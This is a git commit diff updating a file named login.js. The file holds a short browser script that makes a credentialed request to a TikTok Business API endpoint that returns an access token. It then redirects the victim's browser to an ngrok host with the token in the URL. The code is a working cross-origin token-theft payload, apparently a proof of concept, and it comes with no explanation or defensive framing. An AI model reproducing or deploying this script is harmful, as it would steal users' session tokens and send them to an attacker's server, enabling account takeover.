aee5dcbbaadfde7890af96be018309f68a9f3843
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-09-05 01:05:44 +0700

    Update login.js

--- login.js
+++ login.js
@@ -1,10 +1,12 @@
+<script>
 var xhr = new XMLHttpRequest();
 xhr.onload = reqListener; 
-xhr.open("POST", "https://creatormarketplace.tiktok.com/passport/web/mobile/check_code/?aid=2043&account_sdk_source=web&sdk_version=2.1.3-abroad&language=en&verifyFp=verify_lm2k21kf_afHNwSbR_8ntk_4uQ7_AcrK_jEZs5SFJxrvb");
+xhr.open("GET", "https://business.tiktok.com/api/v2/bm/organization/feelgood/access_token/?attr_source=&source_biz_id=&attr_type=web&msToken=yilgIlrMA-vnHZDQITd05O9Fw_wnOYEfz1Ow0MMOoB9SwyExog3jZ9Ar1KUUgTZyi0fpx5gTaqK2QEsEor5IVaCT8V9IIW1uS2RcYs3_Xi99H9IL_KFJ&X-Bogus=DFSzKIVOblhANG1vtyBlnTO8kJMB&_signature=_02B4Z6wo00001uR.lIgAAIDD-DwqNlsNyiLkbpAAAN337a");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/json");
-xhr.send('mix_mode=1&mobile=2e33372a2e33373d343c373d3d303c373d35&code=36363532&type=3631&fixed_mix_mode=1');
+xhr.send();
 
 function reqListener() {
     window.location='https://e884-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
 };
+</script>
